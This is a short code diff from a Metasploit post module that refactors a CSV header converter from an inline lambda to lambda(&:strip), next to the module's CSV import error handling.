@@ -271,7 +271,7 @@ class MetasploitModule < Msf::Post
       headers: :first_row,
       quote_char: "\x00",
       skip_blanks: true,
-      header_converters: ->(f) { f.strip },
+      header_converters: lambda(&:strip),
       converters: ->(f) { f ? f.strip : nil }
     )
     fail_with(Msf::Exploit::Failure::NoTarget, "Error importing CSV file #{file_name}") unless csv
